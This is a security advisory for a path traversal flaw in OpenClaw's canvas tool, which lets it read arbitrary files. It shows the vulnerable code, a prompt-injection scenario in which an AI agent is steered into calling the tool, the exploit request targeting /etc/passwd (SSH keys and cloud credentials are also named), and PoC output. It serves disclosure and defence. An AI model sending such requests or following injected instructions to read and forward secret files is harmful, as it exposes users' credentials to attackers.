# [H] OpenClaw Canvas Path Traversal Information Disclosure Vulnerability

## Summary
Severity: High
Advisory: GHSA-jq4x-98m3-ggq6
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-02
Source: https://github.com/advisories/GHSA-jq4x-98m3-ggq6
Type: github-advisory

## Affected
- npm: `openclaw` — affected >=0 <2026.2.21

## Details
ZDI-CAN-29312: OpenClaw Canvas Path Traversal Information Disclosure Vulnerability

-- ABSTRACT -------------------------------------

Trend Micro's Zero Day Initiative has identified a vulnerability affecting the following products:
OpenClaw - OpenClaw

-- VULNERABILITY DETAILS ------------------------
* Version tested: openclaw 2026.2.17
* Platform tested: macOS 26.3

---

# Analysis

## Description

The OpenClaw gateway's `canvas` tool accepts an `a2ui_push` action with a `jsonlPath` parameter that specifies a filesystem path to read. The gateway reads this file using `fs.readFile()` with no path validation, canonicalization, or directory restriction. An authenticated attacker can supply an arbitrary absolute or relative path to read any file accessible to the gateway process.

The file contents are forwarded to the connected node client via the `canvas.a2ui.pushJSONL` WebSocket command. The gateway itself returns `{ ok: true }` to the HTTP caller, confirming the file was read and transmitted.

## Root Cause

In `src/agents/tools/canvas-tool.ts`, the `a2ui_push` action handler reads a file from disk without any path restrictions:

```typescript
case "a2ui_push": {
  const jsonl =
    typeof params.jsonl === "string" && params.jsonl.trim()
      ? params.jsonl
      : typeof params.jsonlPath === "string" && params.jsonlPath.trim()
        ? await fs.readFile(params.jsonlPath.trim(), "utf8")  // <-- NO PATH VALIDATION
        : "";
  if (!jsonl.trim()) {
    throw new Error("jsonl or jsonlPath required");
  }
  await invoke("canvas.a2ui.pushJSONL", { jsonl });
  return jsonResult({ ok: true });
}
```

The `jsonlPath` parameter is passed directly to `fs.readFile()` after only a `.trim()` call. There is:
- No allowlist of permitted directories
- No canonicalization (`path.resolve` / `realpath`)
- No check against directory traversal sequences (`..`)
- No restriction to `.jsonl` file extensions

## Attack Scenario

### Prompt Injection (Primary)

OpenClaw is an AI agent orchestration tool. AI agents hold the gateway token to invoke tools. A prompt injection attack ��� where malicious instructions are embedded in content the AI processes ��� can direct the agent to call:

```
POST /tools/invoke
Authorization: Bearer <agent's token>
Content-Type: application/json

{
  "tool": "canvas",
  "args": {
    "action": "a2ui_push",
    "jsonlPath": "/etc/passwd",
    "node": "node-host"
  }
}
```

The gateway reads `/etc/passwd` (or any file: `~/.ssh/id_rsa`, `~/.aws/credentials`, `openclaw.json` containing the gateway token itself) and can forward the contents to an attacker connected node.

## Reproduction Steps

### Prerequisites
- Docker installed
- Python 3
- OpenClaw Docker image built as `openclaw:local`

### Steps

1. Navigate to the PoC directory and start the environment:
   ```bash
   cd vulnerabilities/01-canvas-a2ui-push-lfi
   docker compose up -d --wait
   ```

2. This starts two containers:
   - **Gateway** (`openclaw-vuln-01-gateway`): Token-protected OpenClaw gateway on port 18701
   - **Node** (`openclaw-vuln-01-node`): WebSocket node client that logs received data (simulates exfiltration)

3. Wait a few seconds for the node to authenticate, then run the PoC:
   ```bash
   python3 poc.py
   ```

4. The PoC runs three tests:

   | Test | Description | Result |
   |------|-------------|--------|
   | 1 ��� No auth | POST /tools/invoke without token | **401 Unauthorized** |
   | 2 ��� Exploit | POST /tools/invoke with token, `jsonlPath=/etc/passwd` | **200 OK** (file read) |
   | 3 ��� Exfiltration | Check node container logs for received file contents | **/etc/passwd contents visible** |

5. Test 2 sends: `{"tool":"canvas","args":{"action":"a2ui_push","jsonlPath":"/etc/passwd","node":"node-host"}}`. The gateway reads `/etc/passwd` via `fs.readFile()` and forwards the contents to the node via `canvas.a2ui.pushJSONL`. The node logs show the full exfiltrated file:
   ```
   [node] ====== EXFILTRATED FILE CONTENTS via a2ui.pushJSONL ======
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   ...
   node:x:1000:1000::/home/node:/bin/bash
   ```

6. Cleanup:
   ```bash
   docker compose down -v
   ```




-- CREDIT ---------------------------------------
This vulnerability was discovered by:
Peter Girnus (@gothburz) and Project AESIR of TrendAI Zero Day Initiative

-- FURTHER DETAILS ------------------------------

Supporting files: 
[ZDI-CAN-29312.zip](https://github.com/user-attachments/files/25445277/ZDI-CAN-29312.zip)



If supporting files were contained with this report they are provided within a password protected ZIP file. The password is the ZDI candidate number in the form: ZDI-CAN-XXXX where XXXX is the ID number.

Please confirm receipt of this report. We expect all vendors to remediate ZDI vulnerabilities within 120 days of the reported date. If you are ready to release a patch at any point leading up to the deadline, please coordinate with us so that we may release our advisory detailing the issue. If the 120-day deadline is reached and no patch has been made available we will release a limited public advisory with our own mitigations, so that the public can protect themselves in the absence of a patch. Please keep us updated regarding the status of this issue and feel free to contact us at any time:

Zero Day Initiative
zdi-disclosures@trendmicro.com

The PGP key used for all ZDI vendor communications is available from:

  http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc

-- INFORMATION ABOUT THE ZDI --------------------
Established by TippingPoint and acquired by Trend Micro, the Zero Day Initiative (ZDI) neither re-sells vulnerability details nor exploit code. Instead, upon notifying the affected product vendor, the ZDI provides its Trend Micro TippingPoint customers with zero day protection through its intrusion prevention technology. Explicit details regarding the specifics of the vulnerability are not exposed to any parties until an official vendor patch is publicly available.

Please contact Zero Day Initiative for further details or refer to:

  http://www.zerodayinitiative.com

-- DISCLOSURE POLICY ----------------------------

Zero Day Initiative's vulnerability disclosure policy is available online at:

  http://www.zerodayinitiative.com/advisories/disclosure_policy/
    

## Fix Commit(s)
- `39816e61b0c4347a83c9b76bc8883190cfe5a3c9`

## References
- https://github.com/openclaw/openclaw/security/advisories/GHSA-jq4x-98m3-ggq6
- https://github.com/openclaw/openclaw/commit/39816e61b0c4347a83c9b76bc8883190cfe5a3c9
- https://github.com/openclaw/openclaw
